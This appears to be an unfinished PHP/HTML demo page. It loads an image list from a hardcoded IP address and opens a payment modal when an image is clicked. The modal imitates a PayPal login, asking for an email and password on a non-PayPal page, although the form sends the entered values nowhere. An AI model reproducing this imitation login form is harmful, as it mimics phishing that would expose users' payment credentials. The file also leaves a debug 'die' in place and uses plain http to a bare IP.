<?php

$handle = curl_init();
$serverr = "http://34.238.235.155";
$url = "http://34.238.235.155:8000/test2";
curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
curl_setopt($handle, CURLOPT_POST, true);
$output = curl_exec($handle);
curl_close($handle);
$output = json_decode($output,true);

var_dump($output);die;

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Graham</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
          integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-1.12.4.min.js"
            integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"
            integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
            crossorigin="anonymous"></script>
    <style>
        td ,th{
            padding: 4px;
            border:1px solid #00000026;
        }
        .imagess{
            width: 200px;
        }
    </style>
</head>

<body>
<div class="container">
    <h1>Demo</h1>
    <div class="col-md-12">
        <table>
            <tr>
                <?php foreach($output as $i=>$v){ ?>
                    <td>
                        <img class="first imagess" id="<?= $v['key']; ?>" src="<?= $serverr ?><?= $v['image'] ?>" alt="">
                    </td>
                    <?php if ($i % 3 == 0){ ?> </tr> <tr> <?php } ?>
                <?php } ?>

            </tr>

        </table>
    </div>
</div>

<div class="modal fade bs-example-modal-sm in" role="dialog" tabindex="-1" aria-labelledby="mySmallModalLabel">
    <div class="modal-dialog modal-sm" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
                <h4 class="modal-title" id="mySmallModalLabel">Engage Payment</h4>
            </div>
            <div class="modal-body clearfix">
                <div class="col-md-12">
                    <p style="text-align: center">
                        <img src="https://logos-download.com/wp-content/uploads/2016/03/PayPal_logo_logotype_emblem.png" style="width: 100px">
                    </p>
                    <form class="form-horizontal" action="">
                        <div class="form-group">
                            <input type="text" placeholder="Email" class="form-control">
                        </div>
                        <div class="form-group">
                            <input type="password" placeholder="Password" class="form-control">
                        </div>
                        <div class="form-group">
                            <a href="" target="_blank" id="downloaddd" class="form-control">Pay Now</a>
                        </div>
                    </form>

                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(".first").click(function(){
        var img = $(this).attr('id');
        //console.log(img);
        $.post("index2.php",{key:img},function (e) {
            console.log(e);
            $("#downloaddd").attr("href","http://34.238.235.155"+e);
            $(".bs-example-modal-sm").modal("show");
        });
    });
</script>
</body>
</html>
